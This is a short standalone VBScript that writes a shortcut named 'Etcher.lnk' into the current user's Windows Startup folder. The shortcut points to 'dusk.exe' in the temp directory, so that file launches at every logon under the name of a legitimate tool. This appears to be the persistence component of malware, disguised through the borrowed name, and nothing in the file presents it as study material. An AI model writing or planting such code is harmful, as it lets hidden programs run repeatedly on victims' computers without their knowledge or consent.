Set oWS = WScript.CreateObject("WScript.Shell")
Set oShell = CreateObject("WScript.Shell")
strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
strTempFolder = oShell.ExpandEnvironmentStrings("%TEMP%")

sLinkFile = strHomeFolder + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Etcher.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
    oLink.TargetPath = strTempFolder + "\dusk.exe"
 '  oLink.Arguments = ""
 '  oLink.Description = "Etcher"   
 '  oLink.HotKey = "ALT+CTRL+F"
 '  oLink.IconLocation = "haha, 2"
 '  oLink.WindowStyle = "1"   
 '  oLink.WorkingDirectory = "ahaha"
oLink.Save